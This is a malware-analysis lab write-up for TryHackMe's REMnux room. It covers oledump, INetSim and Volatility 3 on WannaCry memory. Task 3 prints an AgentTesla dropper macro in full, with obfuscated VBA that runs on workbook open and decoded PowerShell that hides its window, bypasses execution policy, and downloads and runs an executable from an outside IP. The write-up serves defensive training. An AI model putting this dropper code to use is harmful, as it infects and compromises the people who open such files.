---
title: "REMnux: Getting Started — TryHackMe Cyber Security 101"
date: 2026-06-13
category: "writeup"
excerpt: "Walkthrough of TryHackMe's REMnux: Getting Started room — Learn how you can use the tools inside the REMnux VM."
image: "/images/blog/139.png"
readtime: "38 min read"
draft: false
---

## Tasks

- [Task 1 — Introduction](#task-1)
- [Task 2 — Machine Access](#task-2)
- [Task 3 — File Analysis](#task-3)
- [Task 4 — Fake Network to Aid Analysis](#task-4)
- [Task 5 — Memory Investigation: Evidence Preprocessing](#task-5)
- [Task 6 — Conclusion](#task-6)

---

## Task 1 — Introduction {#task-1}

Malware analysis when you're new to it feels overwhelming. There's a hundred tools, half of them don't install easily, and the ones that do have weird dependencies. Then you have to make sure you don't accidentally run the malware on your machine. It's a lot.

REMnux solves a big chunk of that pain. It's a specialized Linux distro that comes pre-loaded with the tools you'd want for malware work. Volatility for memory analysis, YARA for pattern matching, Wireshark for traffic, oledump for digging into Office docs, INetSim for faking a network, and a pile of others. You boot it up and your lab is ready. No "let me spend three hours installing dependencies" energy.

In this room we'll touch a few of those tools. oledump for picking apart a malicious Excel file, INetSim for simulating a fake internet so malware will phone home without reaching anyone, and Volatility for memory image analysis.

Heads up, this is a "getting started" room. We barely scratch the surface of any one of these tools. Each one of them deserves its own deep dive. The goal here is to know what exists and how to run the basics.

---

## Task 2 — Machine Access {#task-2}

Start the attached machine. Split-screen view loads, takes 2-3 minutes to boot. Most of the files we use are in `/home/ubuntu/Desktop/tasks/`. Easy enough.

No questions on this one, just get the box running.

---

## Task 3 — File Analysis {#task-3}

First tool, **oledump.py**. This thing analyzes OLE2 files, which is the format Microsoft Office uses for older docs and the bits inside newer ones. OLE stands for Object Linking and Embedding. The basic idea is OLE2 files can stash multiple types of data inside a single file. Documents, spreadsheets, presentations, scripts. Macros. Especially macros, because that's where malware loves to hide.

Navigate to `/home/ubuntu/Desktop/tasks/agenttesla/` and our target is `agenttesla.xlsm`. Run:

```bash
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

What you're looking at is the structure of the file broken into "streams". The `A:` line says oledump found a VBA project inside `xl/vbaProject.bin`. Then A1 through A6 are the individual streams within that project.

The thing to spot is the **capital M** next to A4. That means Macro. Not just a hint that a macro exists, an macro with code in it. Lowercase `m` (like A3) means there's a macro reference but no code. Capital M is where the action is.

So A4 is `VBA/ThisWorkbook`, that's where the macro code lives. Let's look at it:

```bash
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

The `-s` flag is short for `--select`. The `4` is the stream number you want.

The output you get back is a hex dump that's barely readable. Lots of `Attribut`, `VB_Nam`, garbage characters. You can SORT of see some recognizable bits like the word "Workbook" but it's painful. The reason it's like this is VBA macros are stored compressed inside the file.

So decompress them:

```bash
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

The `--vbadecompress` flag tells oledump to expand the compressed VBA so you can read it. Now you get something useful:

```
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
...
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```

Now we're getting somewhere. The macro fires on `Workbook_Open()` which means as soon as someone opens the Excel file, this runs. The variable `Sqtnew` is a string that looks like total garbage at first, full of `*` and `^` characters thrown in randomly. But notice the next two lines:

```
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

The macro is stripping out all the `*` and `^` characters. So the garbage is intentional obfuscation. Without those characters mixed in, antivirus tools that scan for common PowerShell patterns might catch the macro right away. With them in, the string looks like nonsense until the macro cleans it up at runtime.

### Clean it up in CyberChef

You don't have to mentally strip the characters yourself. Open CyberChef (there's a local copy on REMnux, or use the online one) and paste the string from the first `Sqtnew = "..."` line into the input.

Add the **Find / Replace** operation twice. First one: find `*`, replace with nothing, set to Simple String. Second one: find `^`, replace with nothing, also Simple String. Bake.

Out comes:

```
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Now THAT is readable PowerShell.

### Breaking down what the PowerShell does

- `-WindowStyle hidden` makes the PowerShell window invisible. The user won't see anything happening when they open the file.
- `-executionpolicy bypass` ignores PowerShell's default restriction on running scripts. Lets anything run regardless of policy.
- `$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } -PassThru` creates a temp file, renames the `.tmp` extension to `.exe`. So now there's an empty `.exe` waiting to be filled with content.
- `Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile` downloads the malware payload from that IP address into the `.exe` we just made. `Invoke-WebRequest` is PowerShell's way of doing what `wget` or `curl` does on Linux.
- `Start-Process $TempFile` runs the downloaded executable.

So the full attack chain is: user opens the Excel file → macro fires → PowerShell launches hidden → downloads a binary disguised with a fake "pdf" name from an attacker server → executes it. Classic dropper. The Excel file itself isn't the real malware, it's just the carrier that pulls down the nasty thing. This is super common because the original file is small and looks innocent to scanners, and the real payload only shows up after execution.

### The other file

The room asks you to scan `possible_malicious.docx` in the same directory:

```bash
oledump.py possible_malicious.docx
```

That returns 16 data streams. Scrolling through them you find stream 8 has the capital M next to it, meaning that's where the macro lives.

**What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?** `oledump.py`

**What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?** `-s`

**During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?** `Invoke-WebRequest`

**What file was being downloaded using the PowerShell script?** `Doc-3737122pdf.exe`

**During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?** `$TempFile`

**How many data streams were presented for `possible_malicious.docx`?** `16`

**At what data stream number does the tool indicate a macro present?** `8`

---

## Task 4 — Fake Network to Aid Analysis {#task-4}

Now for the cooler part. When you're doing dynamic analysis, you need to watch what the malware does on the network. The problem is, if you let it reach the real internet, you might be doing the attacker a favor (or get yourself in trouble). What you want is to FAKE the internet. Let the malware think it's reaching its C2 server, log everything it tried to do, but never send a packet to the real attacker.

**INetSim** is the tool that does exactly this. It's pre-installed on REMnux. It pretends to be a bunch of common services (DNS, HTTP, HTTPS, FTP, SMTP, POP3) and responds to any request that comes in. Malware calls home, INetSim answers, you watch the conversation.

### VMs in play

Two machines for this task. REMnux (the analysis machine) and the AttackBox (which will pretend to be the infected machine). You can switch between them in the TryHackMe interface.

### Configuring INetSim

Before starting INetSim, you have to tell it what IP address to point DNS responses at. Check the REMnux IP first. It's whatever shows up after `ubuntu@` in the terminal, or you can run `ifconfig`.

Then edit the config:

```bash
ubuntu@MACHINE_IP:~$ sudo nano /etc/inetsim/inetsim.conf
```

Find the line that says `#dns_default_ip 0.0.0.0`. Remove the `#` to uncomment, then change `0.0.0.0` to whatever your REMnux IP is. Save with `CTRL+O`, press Enter, exit with `CTRL+X`.

Verify it took:

```bash
ubuntu@MACHINE_IP:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip 
dns_default_ip   MACHINE_IP
```

The uncommented `dns_default_ip` line should show your machine's IP. Good.

Now fire it up:

```bash
ubuntu@MACHINE_IP:~$ sudo inetsim
```

You'll get a bunch of "started" messages for each service. One thing that's a little confusing the first time is `http_80_tcp - failed!`. The room says to ignore it. Something is probably already grabbing port 80, doesn't matter, HTTPS on 443 is still up and that's what we'll use. As long as you see "Simulation running." at the bottom, you're good.

### From the AttackBox

Now switch to the AttackBox. Open a browser and visit `https://MACHINE_IP` where MACHINE_IP is the REMnux IP. The browser will scream about a security risk because INetSim's certificate is self-signed and pretending to be inetsim.org. Click Advanced, Accept the Risk, Continue. You get INetSim's homepage. Cool, the fake server is responding.

### Mimicking malware behavior

A common malware behavior is to download a second-stage payload. Let's simulate that with wget:

```bash
root@MACHINE_IP:~# sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
```

The `--no-check-certificate` flag tells wget to ignore the cert warning. We don't care about the cert, it's our own fake server.

You'll see it connect, complain about the cert in the output, then save `second_payload.zip` to the current directory. Open that file and it's not really a payload, it's INetSim's default fake file (an HTML page). The point isn't the contents, the point is that the request happened.

Try another one:

```bash
sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
```

Same deal. INetSim doesn't care what file you request, it just serves up a fake response and logs the connection. If you open second_payload.ps1 in something, it'll show the INetSim homepage HTML. Fake files all the way down.

The thing this demonstrates is that we just mimicked the network behavior of a real dropper. The malware reached out to a "server", asked for files, and "downloaded" them. INetSim captured the whole thing.

### The connection report

Go back to REMnux and stop INetSim (`CTRL+C` in the terminal where it's running). It'll save a report on its way out:

```
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===
```

Number's gonna be different for you. Read it:

```bash
ubuntu@MACHINE_IP:~$ sudo cat /var/log/inetsim/report/report.2594.txt
```

Output looks like:

```
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42
Simulated start date       : 2024-09-22 21:04:42

2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://MACHINE_IP/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
===
```

Every connection logged. Method, URL, the fake file INetSim served back. In a real engagement, after you let malware run for a while in this fake environment, this report tells you exactly which URLs the malware tried to reach. That's pure intel for IOCs (Indicators of Compromise). Block those URLs at your firewall, search your logs for any other machine that hit them, etc.

For the task questions, also try grabbing `flag.txt`:

```bash
sudo wget https://MACHINE_IP/flag.txt --no-check-certificate
```

Then cat the file. The flag is `Tryhackme{remnux_edition}`. And the report shows the method as `GET`.

**Download and scan flag.txt. What is the flag?** `Tryhackme{remnux_edition}`

**Based on the report, what URL Method was used to get the file flag.txt?** `GET`

---

## Task 5 — Memory Investigation: Evidence Preprocessing {#task-5}

Last big chunk. Memory analysis with **Volatility 3**. Volatility is THE tool for memory forensics. You give it a memory dump (basically a snapshot of RAM from a system), it tells you what was running, what was hidden, what was injected, what was talking to what.

The room makes it clear we're not going to investigate the malware here, just learn how to run the tool and how to preprocess output for someone else to investigate. Each Volatility plugin takes a few minutes to run, so this whole task is slow if you wait between commands.

The memory image is at `/home/ubuntu/Desktop/tasks/Wcry_memory_image/wcry.mem`. WCry, also known as WannaCry, the 2017 ransomware that took down hospitals and shipping companies. Famous sample.

First, become root:

```bash
sudo su
```

Then cd into the directory. All commands going forward are `vol3 -f wcry.mem <plugin>`.

### Plugins one by one

**windows.pstree.PsTree** lists processes in a tree based on parent/child relationships. Useful because malware processes often have weird parents. A `cmd.exe` spawned by `explorer.exe` is normal. A `cmd.exe` spawned by `winword.exe` is sketchy.

```bash
vol3 -f wcry.mem windows.pstree.PsTree
```

In the wcry output you can clearly see `tasksche.exe` (PID 1940) was spawned from `explorer.exe` (PID 1636), which is normal looking but the name is suspicious. And under tasksche.exe there's `@WanaDecryptor@` (PID 740). That's the WannaCry ransom note window.

**windows.pslist.PsList** is the flat list of all active processes. Same info as PsTree but no tree structure. Useful when you just want a list.

**windows.cmdline.CmdLine** shows the command line arguments each process was launched with. This is huge for understanding what each process is doing.

In wcry output:
```
1940  tasksche.exe   "C:\Intel\ivecuqmanpnirkt615\tasksche.exe"
740   @WanaDecryptor@  @WanaDecryptor@.exe
```

So tasksche.exe was running from `C:\Intel\ivecuqmanpnirkt615\` which is NOT a normal Windows folder. `C:\Intel\` is sometimes legit but a random gibberish folder under it is a red flag. Plus the file name tasksche is weird, sounds like "task schedule" but written like a child trying to spell it.

**windows.filescan.FileScan** scans the memory for file objects. Returns 1400+ lines for wcry. Most of it is normal system files but if you grep for known malware file names you can spot stuff. Like `\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe`, `\Intel\ivecuqmanpnirkt615\t.wnry`, `\Intel\ivecuqmanpnirkt615\u.wnry`, `\Intel\ivecuqmanpnirkt615\s.wnry`, `\Intel\ivecuqmanpnirkt615\b.wnry`, `\Intel\ivecuqmanpnirkt615\c.wnry`. The `.wnry` extension is iconic WannaCry. You also see `.WNCRY` extensions in the filescan output which is what WannaCry uses to encrypt files.

**windows.dlllist.DllList** lists all DLLs loaded by each process. Massive output. Useful for finding processes that loaded weird DLLs. For the question about where `@WanaDecryptor@.exe` lives, looking at the DllList output for that process reveals the path `C:\Intel\ivecuqmanpnirkt615`.

**windows.psscan.PsScan** is similar to PsList but it scans memory directly instead of walking the active process list. This can find processes that have been hidden or terminated. In the wcry output you see processes like `taskdl.exe` (PID 860), `taskse.exe` (PID 536), and multiple `@WanaDecryptor@` instances (424, 576) that already exited. PsList wouldn't have shown those because they're not active anymore. PsScan finds them.

**windows.malfind.Malfind** is the one that hunts for injected code in process memory. When malware does process injection (a super common technique to hide inside legitimate processes), Malfind tries to spot it by looking for executable memory regions that don't have a backing file on disk.

For wcry, Malfind flags `csrss.exe` first (PID 596) and `winlogon.exe` second (PID 620) as suspected of having injected code. Both of these are critical Windows system processes. If they have injected code, something is hiding inside them. Classic malware move.

For a full list of plugins:
https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html

### Preprocessing in bulk

Running each plugin and copying the output by hand is fine if you have one image. If you have ten, that's miserable. The room shows a bash loop that runs them all at once and saves each to its own text file:

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Breaking that apart:

- `for plugin in ... do ... done` is a normal bash loop over a list of values.
- `vol3 -q -f wcry.mem $plugin` runs Volatility with `-q` for quiet (no progress bar), `-f wcry.mem` to load the memory image, then the current plugin name from the loop variable.
- `> wcry.$plugin.txt` redirects output to a file named after the plugin. So you end up with `wcry.windows.malfind.Malfind.txt`, `wcry.windows.psscan.PsScan.txt`, etc.

You won't see output in the terminal because of the `-q` and the redirection. After it finishes (takes a while because each plugin is slow), you'll have a folder full of text files, one per plugin. Now an analyst can open any of them in a text editor and grep/search at speed instead of waiting for plugins to run.

### Preprocessing with strings

While we're at it, let's also extract printable strings from the memory image. This is the cheap-and-cheerful approach that often catches stuff Volatility plugins miss. URLs, ransom notes, registry keys, file paths, the lot.

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

Three runs because memory contains strings in multiple encodings:

- The default `strings` gets ASCII.
- `-e l` gets 16-bit little endian (UTF-16LE), which is what most Windows strings are stored as.
- `-e b` gets 16-bit big endian, less common but worth doing for completeness.

Why three files? Because if you only run the default, you'll miss most Windows strings since Windows uses UTF-16LE internally. Run all three and you've got everything covered.

Now you have a folder with Volatility plugin output AND extracted strings. Anyone investigating can grep through these in seconds. That's preprocessing. You did the slow expensive work once so future searches are instant.

**What plugin lists processes in a tree based on their parent process ID?** `PsTree`

**What plugin is used to list all currently active processes in the machine?** `PsList`

**What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?** `strings`

**By running vol3 with the Malfind parameter, what is the first process identified suspected of having an injected code?** `csrss.exe`

**What is the second process identified suspected of having an injected code?** `winlogon.exe`

**By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?** `C:\Intel\ivecuqmanpnirkt615`

---

## Task 6 — Conclusion {#task-6}

That's the appetizer for REMnux. Three tools out of dozens. The room barely scratches the surface but it's a solid intro to the workflow.

A few takeaways from doing this room.

One, **REMnux saves you SO much setup time**. Half of malware analysis tutorials online start with "install volatility, install yara, install x". REMnux already has it. If you're getting into this field, just use REMnux from the start instead of fighting installs on Ubuntu.

Two, **oledump's data streams and the capital M trick is a 30 second triage**. Got a suspicious Office doc? Run oledump on it. If you see a capital M, there's a macro with code. If you see lowercase m, just a reference. Capital M = pull the stream out with `-s N --vbadecompress` and read what it does.

Three, **the obfuscation in that PowerShell was lazy but typical**. Star and caret characters thrown in to break signature matching. CyberChef knocks it out in two operations. The fact that this kind of "obfuscation" still works against some antivirus tools is sad but true.

Four, **INetSim is the single biggest win for dynamic analysis safety**. Without it, you either let malware reach the internet (bad) or you have to build a fake DNS server yourself (annoying). INetSim is both. Just set it up once and use it.

Five, **always preprocess your evidence**. Don't sit there running plugins one at a time during an active incident. Loop through everything, dump it to text files, grep the files. Time matters in incident response and waiting for plugins to finish is the slowest part of memory analysis.

Six, **strings extraction in three encodings is a 30 second IOC harvest**. Run it on every memory image you get. Grep for `http`, for `.exe`, for known bad domain names. You'll find stuff Volatility plugins miss because plugins are looking for STRUCTURE while strings just dumps everything readable.

REMnux is one of those tools where the more you use it, the more tools you discover you didn't know it had. This room covered three. There are dozens more. Onto the next one.

---